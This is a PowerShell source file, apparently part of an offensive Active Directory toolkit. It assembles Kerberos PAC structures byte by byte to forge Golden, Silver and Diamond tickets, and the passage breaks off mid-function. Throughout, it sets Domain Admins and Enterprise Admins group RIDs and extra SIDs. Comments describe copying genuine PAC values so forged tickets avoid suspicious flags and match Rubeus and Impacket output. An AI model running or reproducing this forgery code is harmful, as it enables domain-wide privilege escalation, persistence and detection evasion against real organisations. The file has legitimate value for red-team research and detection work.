    # Helper: pull a value from -SourceInfo, falling back to a default when the key is
    # absent or null. Keeps the synthetic Golden/Silver behavior intact (no SourceInfo).
    function Get-SourceValue {
        param([string]$Key, $Default)
        if ($SourceInfo -and $SourceInfo.ContainsKey($Key) -and $null -ne $SourceInfo[$Key]) {
            return $SourceInfo[$Key]
        }
        return $Default
    }

    # Set default times (use NEVER = 0x7FFFFFFFFFFFFFFF for most times like Rubeus)
    if (-not $LogonTime) { $LogonTime = [datetime]::UtcNow }

    # NEVER times - using the raw FILETIME value that Rubeus uses
    # This is 0x7FFFFFFFFFFFFFFF in little-endian
    $NEVER_TIME = [int64]0x7FFFFFFFFFFFFFFF

    # Resolve per-user values: real values from -SourceInfo (Diamond "recut") or
    # the synthetic Golden/Silver defaults when no source is provided.
    $srcFullName           = [string](Get-SourceValue 'FullName' "")
    $srcLogonScript        = [string](Get-SourceValue 'LogonScript' "")
    $srcProfilePath        = [string](Get-SourceValue 'ProfilePath' "")
    $srcHomeDirectory      = [string](Get-SourceValue 'HomeDirectory' "")
    $srcHomeDirectoryDrive = [string](Get-SourceValue 'HomeDirectoryDrive' "")
    $srcLogonServer        = [string](Get-SourceValue 'LogonServer' "")
    $srcLogonCount         = [uint16](Get-SourceValue 'LogonCount' 0)
    $srcBadPasswordCount   = [uint16](Get-SourceValue 'BadPasswordCount' 0)
    $srcLogoffTime         = [int64](Get-SourceValue 'LogoffTimeRaw' $NEVER_TIME)
    $srcKickOffTime        = [int64](Get-SourceValue 'KickOffTimeRaw' $NEVER_TIME)
    $srcPasswordLastSet    = [int64](Get-SourceValue 'PasswordLastSetRaw' $NEVER_TIME)
    $srcPasswordCanChange  = [int64](Get-SourceValue 'PasswordCanChangeRaw' $NEVER_TIME)
    $srcPasswordMustChange = [int64](Get-SourceValue 'PasswordMustChangeRaw' $NEVER_TIME)
    $srcGroupAttributes    = Get-SourceValue 'GroupAttributes' $null

    # NDR pointer IDs (unique pointers, must not collide with top-level referent 0x00020000)
    # Pointer IDs are incremented by 4 (not 1) to maintain 4-byte alignment
    $ptrId = 0x00020004
    $ptrIdStep = 4

    # NDR type serialization header (MS-RPCE 2.2.6)
    # This header is required for the LOGON_INFO buffer
    $ndrHeader = @()

    # Common Type Header (8 bytes)
    $ndrHeader += [byte]0x01           # Version
    $ndrHeader += [byte]0x10           # Endianness (little-endian)
    $ndrHeader += Write-UInt16LE -Value 8   # CommonHeaderLength
    $ndrHeader += [byte[]]@(0xCC, 0xCC, 0xCC, 0xCC)  # Filler

    # Private Header (8 bytes) - ObjectBufferLength filled later
    # Patched after we know the total payload size (at offset 8 in header)
    $ndrHeader += Write-UInt32LE -Value 0  # ObjectBufferLength (patched later)
    $ndrHeader += [byte[]]@(0x00, 0x00, 0x00, 0x00)  # Filler

    # Top-level unique pointer referent ID
    $ndrHeader += Write-UInt32LE -Value 0x00020000

    # Build the fixed part of KERB_VALIDATION_INFO
    $fixedPart = @()

    # LogonTime (FILETIME)
    $fixedPart += Write-Int64LE -Value (ConvertTo-FileTime -DateTime $LogonTime)

    # LogoffTime (FILETIME) - real value (recut) or NEVER like Rubeus
    $fixedPart += Write-Int64LE -Value $srcLogoffTime

    # KickOffTime (FILETIME)
    $fixedPart += Write-Int64LE -Value $srcKickOffTime

    # PasswordLastSet (FILETIME)
    $fixedPart += Write-Int64LE -Value $srcPasswordLastSet

    # PasswordCanChange (FILETIME)
    $fixedPart += Write-Int64LE -Value $srcPasswordCanChange

    # PasswordMustChange (FILETIME)
    $fixedPart += Write-Int64LE -Value $srcPasswordMustChange

    # EffectiveName (RPC_UNICODE_STRING)
    $ptrEffectiveName = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value $UserName -PointerId $ptrEffectiveName

    # FullName (RPC_UNICODE_STRING) - real value (recut) or empty; Rubeus still allocates a pointer
    $ptrFullName = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value $srcFullName -PointerId $ptrFullName

    # LogonScript (RPC_UNICODE_STRING)
    $ptrLogonScript = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value $srcLogonScript -PointerId $ptrLogonScript

    # ProfilePath (RPC_UNICODE_STRING)
    $ptrProfilePath = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value $srcProfilePath -PointerId $ptrProfilePath

    # HomeDirectory (RPC_UNICODE_STRING)
    $ptrHomeDir = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value $srcHomeDirectory -PointerId $ptrHomeDir

    # HomeDirectoryDrive (RPC_UNICODE_STRING)
    $ptrHomeDirDrive = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value $srcHomeDirectoryDrive -PointerId $ptrHomeDirDrive

    # LogonCount (USHORT) - real value (recut) or 0
    $fixedPart += Write-UInt16LE -Value $srcLogonCount

    # BadPasswordCount (USHORT)
    $fixedPart += Write-UInt16LE -Value $srcBadPasswordCount

    # UserId (ULONG) - User RID
    $fixedPart += Write-UInt32LE -Value $UserRID

    # PrimaryGroupId (ULONG)
    $fixedPart += Write-UInt32LE -Value $PrimaryGroupRID

    # GroupCount (ULONG)
    $groupCount = if ($null -eq $GroupRIDs) { 0 } else { @($GroupRIDs).Count }
    Write-Verbose "[Build-KerbValidationInfo] GroupRIDs=$($GroupRIDs -join ','), groupCount=$groupCount, ptrId=0x$($ptrId.ToString('X8'))"
    $fixedPart += Write-UInt32LE -Value $groupCount

    # GroupIds (pointer to GROUP_MEMBERSHIP array)
    if ($groupCount -gt 0) {
        $ptrGroups = $ptrId
        $ptrId += $ptrIdStep
    } else {
        $ptrGroups = 0
    }
    Write-Verbose "[Build-KerbValidationInfo] ptrGroups=0x$($ptrGroups.ToString('X8'))"
    $fixedPart += Write-UInt32LE -Value $ptrGroups

    # UserFlags (ULONG) - LOGON_EXTRA_SIDS if we have extra SIDs
    $userFlags = 0
    if ($ExtraSIDs.Count -gt 0) {
        $userFlags = 0x20  # LOGON_EXTRA_SIDS
    }
    $fixedPart += Write-UInt32LE -Value $userFlags

    # UserSessionKey (USER_SESSION_KEY - 16 bytes, all zeros)
    $fixedPart += [byte[]]::new(16)

    # LogonServer (RPC_UNICODE_STRING) - real value (recut) or empty like Rubeus
    $ptrLogonServer = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value $srcLogonServer -PointerId $ptrLogonServer

    # LogonDomainName (RPC_UNICODE_STRING)
    $ptrLogonDomain = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UnicodeStringRPC -Value $Domain.ToUpper() -PointerId $ptrLogonDomain

    # LogonDomainId (PISID - pointer to SID)
    $ptrDomainSid = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UInt32LE -Value $ptrDomainSid

    # Reserved1 (2 ULONGs)
    $fixedPart += Write-UInt32LE -Value 0
    $fixedPart += Write-UInt32LE -Value 0

    # UserAccountControl (ULONG)
    $fixedPart += Write-UInt32LE -Value $UserAccountControl

    # SubAuthStatus (ULONG)
    $fixedPart += Write-UInt32LE -Value 0

    # LastSuccessfulILogon (FILETIME)
    $fixedPart += Write-Int64LE -Value 0

    # LastFailedILogon (FILETIME)
    $fixedPart += Write-Int64LE -Value 0

    # FailedILogonCount (ULONG)
    $fixedPart += Write-UInt32LE -Value 0

    # Reserved3 (ULONG)
    $fixedPart += Write-UInt32LE -Value 0

    # SidCount (ULONG)
    $sidCount = $ExtraSIDs.Count
    $fixedPart += Write-UInt32LE -Value $sidCount

    # ExtraSids (pointer to KERB_SID_AND_ATTRIBUTES array)
    # Rubeus allocates a pointer even when SidCount = 0
    $ptrExtraSids = $ptrId; $ptrId += $ptrIdStep
    $fixedPart += Write-UInt32LE -Value $ptrExtraSids

    # ResourceGroupDomainSid (PISID - NULL, no resource groups)
    # Rubeus uses NULL here when no resource groups are present
    $fixedPart += Write-UInt32LE -Value 0

    # ResourceGroupCount (ULONG)
    $fixedPart += Write-UInt32LE -Value 0

    # ResourceGroupIds (pointer - null, no resource groups)
    $fixedPart += Write-UInt32LE -Value 0

    # Build referent data (strings, SIDs, arrays pointed to by the structure)
    # CRITICAL: Referent data must appear in the SAME ORDER as pointer declarations!
    # Rubeus allocates pointers for ALL strings, even empty ones, and includes their referent data
    # Order: EffectiveName, FullName, LogonScript, ProfilePath, HomeDir, HomeDirDrive,
    #        GroupIds, LogonServer, LogonDomainName, LogonDomainId, ExtraSids
    $referentData = @()

    # EffectiveName string data
    $referentData += Write-UnicodeStringData -Value $UserName

    # FullName string data (real value for recut, else empty)
    $referentData += Write-UnicodeStringData -Value $srcFullName

    # LogonScript string data
    $referentData += Write-UnicodeStringData -Value $srcLogonScript

    # ProfilePath string data
    $referentData += Write-UnicodeStringData -Value $srcProfilePath

    # HomeDirectory string data
    $referentData += Write-UnicodeStringData -Value $srcHomeDirectory

    # HomeDirectoryDrive string data
    $referentData += Write-UnicodeStringData -Value $srcHomeDirectoryDrive

    # GroupIds array (if present)
    if ($groupCount -gt 0) {
        # NDR conformant array: MaximumCount
        $referentData += Write-UInt32LE -Value $groupCount

        # Use per-group attributes from the source PAC when available (recut), so preserved
        # groups keep their real SE_GROUP_* flags. Index-aligned with $GroupRIDs; injected
        # groups beyond the source list fall back to the default attributes.
        $srcGroupAttrsArr = if ($null -ne $srcGroupAttributes) { @($srcGroupAttributes) } else { @() }
        for ($gi = 0; $gi -lt $GroupRIDs.Count; $gi++) {
            if ($gi -lt $srcGroupAttrsArr.Count) {
                $referentData += New-GroupMembership -RelativeId $GroupRIDs[$gi] -Attributes ([uint32]$srcGroupAttrsArr[$gi])
            } else {
                $referentData += New-GroupMembership -RelativeId $GroupRIDs[$gi]
            }
        }
    }

    # LogonServer string data (real value for recut, else empty like Rubeus)
    $referentData += Write-UnicodeStringData -Value $srcLogonServer

    # LogonDomainName string data
    $referentData += Write-UnicodeStringData -Value $Domain.ToUpper()

    # LogonDomainId SID data
    $referentData += Write-SIDNDR -SIDString $DomainSID

    # ExtraSids referent data
    # Rubeus always includes referent data for the ExtraSids pointer
    if ($sidCount -gt 0) {
        # NDR conformant array: MaximumCount
        $referentData += Write-UInt32LE -Value $sidCount

        # First, write the KERB_SID_AND_ATTRIBUTES array (pointers + attributes)
        $sidPtrId = $ptrId
        foreach ($extraSid in $ExtraSIDs) {
            $referentData += New-SidAndAttributes -SID $extraSid -PointerId $sidPtrId
            $sidPtrId += $ptrIdStep
        }

        # Then, write the actual SID data for each
        foreach ($extraSid in $ExtraSIDs) {
            $referentData += Write-SIDNDR -SIDString $extraSid
        }
    } else {
        # Empty ExtraSids: write 8 null bytes as empty referent data (like Rubeus)
        $referentData += [byte[]]@(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
    }

    # Combine fixed part and referent data into the payload
    $payload = ConvertTo-FlatByteArray ($fixedPart + $referentData)

    # Patch the ObjectBufferLength in the private header
    # Rubeus includes the 4-byte top-level referent ID in the ObjectBufferLength
    $ndrHeaderBytes = ConvertTo-FlatByteArray $ndrHeader
    $objectBufferLength = $payload.Length + 4  # +4 for top-level referent ID (like Rubeus)
    $lengthBytes = [BitConverter]::GetBytes([uint32]$objectBufferLength)
    [Array]::Copy($lengthBytes, 0, $ndrHeaderBytes, 8, 4)

    # Combine NDR header + payload
    return ($ndrHeaderBytes + $payload)
}

# ============================================================================
# PAC_CLIENT_INFO Structure (MS-PAC 2.7)
# ============================================================================

function Build-PACClientInfo {
    <#
    .SYNOPSIS
        Builds a PAC_CLIENT_INFO structure.
    .DESCRIPTION
        PAC_CLIENT_INFO:
        - ClientId (FILETIME): Time when AS request was received
        - NameLength (USHORT): Length of Name in bytes
        - Name (variable): Client name in Unicode
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ClientName,

        [Parameter(Mandatory=$false)]
        [datetime]$ClientId
    )

    if (-not $ClientId) { $ClientId = [datetime]::UtcNow }

    $nameBytes = [System.Text.Encoding]::Unicode.GetBytes($ClientName)

    $result = @()
    $result += Write-Int64LE -Value (ConvertTo-FileTime -DateTime $ClientId)
    $result += Write-UInt16LE -Value $nameBytes.Length
    $result += $nameBytes

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# PAC_SIGNATURE_DATA Structure (MS-PAC 2.8)
# ============================================================================

function Build-PACSignature {
    <#
    .SYNOPSIS
        Builds a PAC_SIGNATURE_DATA structure with zeroed signature.
    .DESCRIPTION
        PAC_SIGNATURE_DATA (as used by Kerberos implementations):
        - SignatureType (LONG): Checksum algorithm
        - Signature (variable): The signature bytes (zeroed for later calculation)

        Note: RODCIdentifier is NOT included - it is only present in PACs
        generated by Read-Only Domain Controllers.

    .PARAMETER SignatureType
        The checksum algorithm:
        - -138 (HMAC_MD5) for RC4-HMAC
        - 16 (HMAC_SHA1_96_AES256) for AES256
        - 15 (HMAC_SHA1_96_AES128) for AES128

    .NOTES
        The signature is initially zeroed and must be computed after
        the entire PAC is assembled.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$SignatureType
    )

    $result = @()

    # SignatureType (4 bytes, signed)
    $result += Write-Int32LE -Value $SignatureType

    # Signature (variable length based on type)
    $sigLength = switch ($SignatureType) {
        $Script:KERB_CHECKSUM_HMAC_MD5 { 16 }             # HMAC-MD5: 16 bytes
        $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES128 { 12 }  # HMAC-SHA1-96: 12 bytes
        $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES256 { 12 }  # HMAC-SHA1-96: 12 bytes
        default { 16 }
    }

    $result += [byte[]]::new($sigLength)  # Zeroed signature placeholder

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# PAC_INFO_BUFFER Structure (MS-PAC 2.3)
# ============================================================================

function New-PACInfoBuffer {
    <#
    .SYNOPSIS
        Creates a PAC_INFO_BUFFER descriptor.
    .DESCRIPTION
        PAC_INFO_BUFFER:
        - ulType (ULONG): Type of buffer (PAC_LOGON_INFO, etc.)
        - cbBufferSize (ULONG): Size of buffer data
        - Offset (ULONGLONG): Offset to buffer data from start of PAC
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [uint32]$Type,

        [Parameter(Mandatory=$true)]
        [uint32]$Size,

        [Parameter(Mandatory=$true)]
        [uint64]$Offset
    )

    $result = @()
    $result += Write-UInt32LE -Value $Type
    $result += Write-UInt32LE -Value $Size
    $result += Write-UInt64LE -Value $Offset

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# PAC_UPN_DNS_INFO Builder (MS-PAC 2.10)
# ============================================================================

function Build-PACUpnDnsInfo {
    <#
    .SYNOPSIS
        Builds a PAC_UPN_DNS_INFO structure from scratch.
    .DESCRIPTION
        PAC_UPN_DNS_INFO contains:
        - UPN (user principal name)
        - DNS domain name
        - Flags (0x01 = UPN_CONSTRUCTED - matches Rubeus format)

        Note: We use Flags=0x01 (UPN_CONSTRUCTED) without EXTENDED data
        to match Rubeus behavior. EXTENDED (0x02) format with SamName/SID
        is used by real KDC but can cause issues with some implementations.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$UserName,

        [Parameter(Mandatory=$true)]
        [string]$DnsDomainName,

        [Parameter(Mandatory=$true)]
        [string]$DomainSID,

        [Parameter(Mandatory=$true)]
        [uint32]$UserRID
    )

    $upn = "$UserName@$($DnsDomainName.ToLowerInvariant())"
    $upnBytes = [System.Text.Encoding]::Unicode.GetBytes($upn)
    $dnsBytes = [System.Text.Encoding]::Unicode.GetBytes($DnsDomainName.ToUpperInvariant())

    # Use UPN_CONSTRUCTED flag (0x01) like Rubeus - simpler format without SamName/SID
    # MS-PAC 2.10: Flag 0x01 = S flag (UPN constructed from sAMAccountName and dnsDomainName)
    # Rubeus adds 4 bytes padding after Flags, making header 16 bytes
    $flags = [uint32]0x01
    $headerSize = 16  # 2+2+2+2+4+4(padding) = 16 bytes (like Rubeus)
    $upnOffset = $headerSize
    $dnsOffset = $upnOffset + $upnBytes.Length

    $result = @()
    $result += Write-UInt16LE -Value $upnBytes.Length        # UPN Length
    $result += Write-UInt16LE -Value $upnOffset              # UPN Offset
    $result += Write-UInt16LE -Value $dnsBytes.Length        # DNS Length
    $result += Write-UInt16LE -Value $dnsOffset              # DNS Offset
    $result += Write-UInt32LE -Value $flags                  # Flags (UPN_CONSTRUCTED)
    $result += [byte[]]@(0x00, 0x00, 0x00, 0x00)             # Padding (like Rubeus)
    $result += [byte[]]$upnBytes
    $result += [byte[]]$dnsBytes

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# PAC_REQUESTOR Builder (MS-PAC 2.12)
# ============================================================================

function Build-PACRequestor {
    <#
    .SYNOPSIS
        Builds a PAC_REQUESTOR structure from scratch.
    .DESCRIPTION
        PAC_REQUESTOR is simply a raw SID identifying the requestor.
        For a TGT, this is the user's full SID (DomainSID + UserRID).
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidatePattern('^S-1-5-21-\d+-\d+-\d+$')]
        [string]$DomainSID,

        [Parameter(Mandatory=$true)]
        [uint32]$UserRID
    )

    # Build SID bytes: DomainSID-UserRID
    $sidParts = $DomainSID -split '-'

    # Validate SID has expected structure (S-1-5-21-x-x-x = 7 parts minimum)
    if ($sidParts.Length -lt 4) {
        throw "Invalid DomainSID format: $DomainSID - expected S-1-5-21-x-x-x format"
    }
    $sidRevision = [byte]1
    $sidSubAuthCount = [byte]($sidParts.Length - 3 + 1)  # domain sub-authorities + user RID
    $sidAuthority = [byte[]]::new(6)
    $authValue = [uint64]$sidParts[2]
    $sidAuthority[0] = [byte](($authValue -shr 40) -band 0xFF)
    $sidAuthority[1] = [byte](($authValue -shr 32) -band 0xFF)
    $sidAuthority[2] = [byte](($authValue -shr 24) -band 0xFF)
    $sidAuthority[3] = [byte](($authValue -shr 16) -band 0xFF)
    $sidAuthority[4] = [byte](($authValue -shr 8) -band 0xFF)
    $sidAuthority[5] = [byte]($authValue -band 0xFF)

    $result = @()
    $result += $sidRevision
    $result += $sidSubAuthCount
    $result += [byte[]]$sidAuthority
    # Domain sub-authorities
    for ($i = 3; $i -lt $sidParts.Length; $i++) {
        $result += [BitConverter]::GetBytes([uint32]$sidParts[$i])
    }
    # User RID
    $result += [BitConverter]::GetBytes([uint32]$UserRID)

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# PAC_ATTRIBUTES_INFO Builder (MS-PAC 2.11)
# ============================================================================

function Build-PACAttributesInfo {
    <#
    .SYNOPSIS
        Builds a PAC_ATTRIBUTES_INFO structure.
    .DESCRIPTION
        PAC_ATTRIBUTES_INFO (MS-PAC 2.11) contains:
        - FlagsLength (ULONG): Length of valid flag bits (value=2 means bits 0-1 are valid)
        - Flags (ULONG): Flag bits
        Flags:
        - Bit 0 (0x00000001) = PAC_WAS_REQUESTED (client requested PAC via PA-PAC-OPTIONS)
        - Bit 1 (0x00000002) = PAC_WAS_GIVEN_IMPLICITLY (client did not request/decline PAC)
    #>
    [CmdletBinding()]
    param(
        [uint32]$FlagsLength = 2,   # 2 valid flag bits defined in spec
        [uint32]$Flags = 1          # PAC_WAS_REQUESTED
    )

    $result = @()
    $result += Write-UInt32LE -Value $FlagsLength    # FlagsLength (number of valid flag bits)
    $result += Write-UInt32LE -Value $Flags           # Flags (PAC_WAS_REQUESTED = 1)

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# Complete PAC Builder
# ============================================================================

function Build-PAC {
    <#
    .SYNOPSIS
        Builds a complete PAC (Privilege Attribute Certificate) structure.

    .DESCRIPTION
        Creates a full PAC suitable for embedding in a Kerberos ticket.
        The PAC contains:
        - KERB_VALIDATION_INFO: User info and group memberships
        - PAC_CLIENT_INFO: Client name and timestamp
        - PAC_SERVER_CHECKSUM: Server signature (zeroed, needs computation)
        - PAC_PRIVSVR_CHECKSUM: KDC signature (zeroed, needs computation)

    .PARAMETER UserName
        The sAMAccountName of the user.

    .PARAMETER Domain
        The NetBIOS domain name (e.g., "CONTOSO").

    .PARAMETER DnsDomainName
        The DNS domain name (e.g., "contoso.com"). Used for UPN_DNS_INFO buffer.
        If not specified, derived from Domain parameter.

    .PARAMETER DomainSID
        The domain SID string (e.g., "S-1-5-21-xxx-xxx-xxx").

    .PARAMETER UserRID
        The user's relative identifier (RID).

    .PARAMETER GroupRIDs
        Array of group RIDs the user belongs to.
        For Golden Ticket, typically includes: 512 (Domain Admins), 513 (Domain Users),
        518 (Schema Admins), 519 (Enterprise Admins), 520 (Group Policy Creator Owners).

    .PARAMETER ExtraSIDs
        Array of extra SIDs for cross-domain/universal group membership.
        Can include SIDs like S-1-18-1 (Authentication Authority Asserted Identity).

    .PARAMETER EncryptionType
        The encryption type for signature algorithm:
        - 23: RC4-HMAC (uses HMAC-MD5)
        - 17: AES128-CTS (uses HMAC-SHA1-96)
        - 18: AES256-CTS (uses HMAC-SHA1-96)

    .PARAMETER LogonTime
        The logon time (default: current time).

    .PARAMETER AuthTime
        The authentication time. MUST match EncTicketPart.authtime exactly.
        Truncated to second-level precision internally (Kerberos GeneralizedTime limitation).

    .EXAMPLE
        $authTime = [datetime]::UtcNow
        $pac = Build-PAC -UserName "administrator" -Domain "CONTOSO" `
            -DnsDomainName "contoso.com" -DomainSID "S-1-5-21-xxx-xxx-xxx" `
            -UserRID 500 -GroupRIDs @(512, 513, 518, 519, 520) `
            -EncryptionType 23 -AuthTime $authTime

    .OUTPUTS
        PSCustomObject with properties:
        - PACData: Complete PAC bytes
        - ServerChecksumOffset: Offset to server signature
        - KDCChecksumOffset: Offset to KDC signature

    .NOTES
        After building the PAC, the signatures must be computed:
        1. Server checksum: HMAC over PAC with server signature zeroed
        2. KDC checksum: HMAC over server checksum
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$UserName,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$DnsDomainName,

        [Parameter(Mandatory=$true)]
        [string]$DomainSID,

        [Parameter(Mandatory=$true)]
        [uint32]$UserRID,

        [Parameter(Mandatory=$false)]
        [uint32[]]$GroupRIDs = @($Script:DOMAIN_GROUP_RID_USERS),

        [Parameter(Mandatory=$false)]
        [string[]]$ExtraSIDs = @(),

        [Parameter(Mandatory=$false)]
        [ValidateSet(17, 18, 23)]
        [int]$EncryptionType = 23,

        [Parameter(Mandatory=$false)]
        [datetime]$LogonTime,

        [Parameter(Mandatory=$true)]
        [datetime]$AuthTime,

        # The user's primary group RID. Defaults to Domain Users; Diamond "recut" passes the
        # real value extracted from the genuine PAC.
        [Parameter(Mandatory=$false)]
        [uint32]$PrimaryGroupRID = $Script:DOMAIN_GROUP_RID_USERS,

        # UAC flags for the account. Defaults to NORMAL_ACCOUNT; Diamond "recut" passes the
        # real value so suspicious synthetic flags are not introduced.
        [Parameter(Mandatory=$false)]
        [uint32]$UserAccountControl = $Script:USER_NORMAL_ACCOUNT,

        # Optional rich per-user fields for the Diamond Ticket "recut" rebuild (see
        # Build-KerbValidationInfo -SourceInfo). Ignored for Golden/Silver (not passed).
        [Parameter(Mandatory=$false)]
        [hashtable]$SourceInfo
    )

    if (-not $LogonTime) { $LogonTime = [datetime]::UtcNow }

    # CRITICAL: AuthTime must be truncated to second-level precision!
    # Kerberos GeneralizedTime (used in EncTicketPart.authtime) has only second precision,
    # but FILETIME (used in CLIENT_INFO.ClientId) has 100-nanosecond precision.
    # If we don't truncate, CLIENT_INFO.ClientId won't match the KDC's comparison value.
    $AuthTime = [datetime]::new($AuthTime.Year, $AuthTime.Month, $AuthTime.Day,
        $AuthTime.Hour, $AuthTime.Minute, $AuthTime.Second, [System.DateTimeKind]::Utc)

    # Derive DNS domain name if not provided
    if (-not $DnsDomainName) {
        if ($Script:LDAPContext -and $Script:LDAPContext.Domain) {
            $DnsDomainName = $Script:LDAPContext.Domain
        }
        else {
            $DnsDomainName = $Domain.ToLowerInvariant()
        }
    }

    # Determine signature type based on encryption
    $sigType = switch ($EncryptionType) {
        23 { $Script:KERB_CHECKSUM_HMAC_MD5 }
        17 { $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES128 }
        18 { $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES256 }
    }

    # Build individual PAC buffers
    # Force conversion to byte[] - PowerShell array concatenation creates Object[]
    $validationInfoParams = @{
        UserName   = $UserName
        Domain     = $Domain
        DomainSID  = $DomainSID
        UserRID    = $UserRID
        GroupRIDs  = $GroupRIDs
        ExtraSIDs  = $ExtraSIDs
        LogonTime  = $LogonTime
        PrimaryGroupRID    = $PrimaryGroupRID
        UserAccountControl = $UserAccountControl
    }
    if ($SourceInfo) { $validationInfoParams['SourceInfo'] = $SourceInfo }
    $validationInfo = [byte[]](Build-KerbValidationInfo @validationInfoParams)

    # CLIENT_INFO.ClientId MUST match EncTicketPart.authtime for DC validation!
    $clientInfo = [byte[]](Build-PACClientInfo -ClientName $UserName -ClientId $AuthTime)

    $upnDnsInfo = [byte[]](Build-PACUpnDnsInfo -UserName $UserName `
        -DnsDomainName $DnsDomainName -DomainSID $DomainSID -UserRID $UserRID)

    $attributesInfo = [byte[]](Build-PACAttributesInfo)  # FlagsLength=2, Flags=1 (PAC_WAS_REQUESTED)

    $requestorInfo = [byte[]](Build-PACRequestor -DomainSID $DomainSID -UserRID $UserRID)

    $serverSig = [byte[]](Build-PACSignature -SignatureType $sigType)
    $kdcSig = [byte[]](Build-PACSignature -SignatureType $sigType)

    # 7 buffers matching Rubeus/Impacket order:
    # LOGON_INFO, CLIENT_INFO, UPN_DNS_INFO, ATTRIBUTES_INFO, REQUESTOR, SERVER_CHECKSUM, PRIVSVR_CHECKSUM
    $bufferCount = 7

    Write-Verbose "[Build-PAC] Buffer sizes: LOGON_INFO=$($validationInfo.Length), CLIENT_INFO=$($clientInfo.Length), UPN_DNS=$($upnDnsInfo.Length), ATTRIBUTES=$($attributesInfo.Length), REQUESTOR=$($requestorInfo.Length), ServerSig=$($serverSig.Length), KDCSig=$($kdcSig.Length)"

    # Calculate header size: cBuffers (4) + Version (4) + N * PAC_INFO_BUFFER (16 each)
    $headerSize = 8 + ($bufferCount * 16)

    # Align each buffer to 8-byte boundary
    function Align8 { param([int]$Size) return [math]::Ceiling($Size / 8) * 8 }

    $validationInfoPadded = Align8 $validationInfo.Length
    $clientInfoPadded = Align8 $clientInfo.Length
    $upnDnsInfoPadded = Align8 $upnDnsInfo.Length
    $attributesInfoPadded = Align8 $attributesInfo.Length
    $requestorInfoPadded = Align8 $requestorInfo.Length
    $serverSigPadded = Align8 $serverSig.Length
    $kdcSigPadded = Align8 $kdcSig.Length

    # Calculate offsets (sequential, 8-byte aligned)
    $offset1 = $headerSize                                              # LOGON_INFO
    $offset2 = $offset1 + $validationInfoPadded                        # CLIENT_INFO
    $offset3 = $offset2 + $clientInfoPadded                            # UPN_DNS_INFO
    $offset4 = $offset3 + $upnDnsInfoPadded                            # ATTRIBUTES_INFO
    $offset5 = $offset4 + $attributesInfoPadded                        # REQUESTOR
    $offset6 = $offset5 + $requestorInfoPadded                         # SERVER_CHECKSUM
    $offset7 = $offset6 + $serverSigPadded                             # PRIVSVR_CHECKSUM

    # Build PAC header (PACTYPE structure)
    $pacHeader = [System.Collections.Generic.List[byte]]::new()
    $pacHeader.AddRange([byte[]](Write-UInt32LE -Value $bufferCount))    # cBuffers
    $pacHeader.AddRange([byte[]](Write-UInt32LE -Value 0))               # Version

    # PAC_INFO_BUFFER entries (same order as Rubeus/Impacket)
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_LOGON_INFO -Size $validationInfo.Length -Offset $offset1))
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_CLIENT_INFO_TYPE -Size $clientInfo.Length -Offset $offset2))
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_UPN_DNS_INFO -Size $upnDnsInfo.Length -Offset $offset3))
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_ATTRIBUTES_INFO -Size $attributesInfo.Length -Offset $offset4))
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_REQUESTOR -Size $requestorInfo.Length -Offset $offset5))
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_SERVER_CHECKSUM -Size $serverSig.Length -Offset $offset6))
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_PRIVSVR_CHECKSUM -Size $kdcSig.Length -Offset $offset7))

    # Build complete PAC
    $pac = [System.Collections.Generic.List[byte]]::new()
    $pac.AddRange([byte[]]$pacHeader.ToArray())

    # Add LOGON_INFO with padding
    $pac.AddRange($validationInfo)
    $padding1 = $validationInfoPadded - $validationInfo.Length
    if ($padding1 -gt 0) { $pac.AddRange([byte[]]::new($padding1)) }

    # Add CLIENT_INFO with padding
    $pac.AddRange($clientInfo)
    $padding2 = $clientInfoPadded - $clientInfo.Length
    if ($padding2 -gt 0) { $pac.AddRange([byte[]]::new($padding2)) }

    # Add UPN_DNS_INFO with padding
    $pac.AddRange($upnDnsInfo)
    $padding3 = $upnDnsInfoPadded - $upnDnsInfo.Length
    if ($padding3 -gt 0) { $pac.AddRange([byte[]]::new($padding3)) }

    # Add ATTRIBUTES_INFO with padding
    $pac.AddRange($attributesInfo)
    $padding4 = $attributesInfoPadded - $attributesInfo.Length
    if ($padding4 -gt 0) { $pac.AddRange([byte[]]::new($padding4)) }

    # Add REQUESTOR with padding
    $pac.AddRange($requestorInfo)
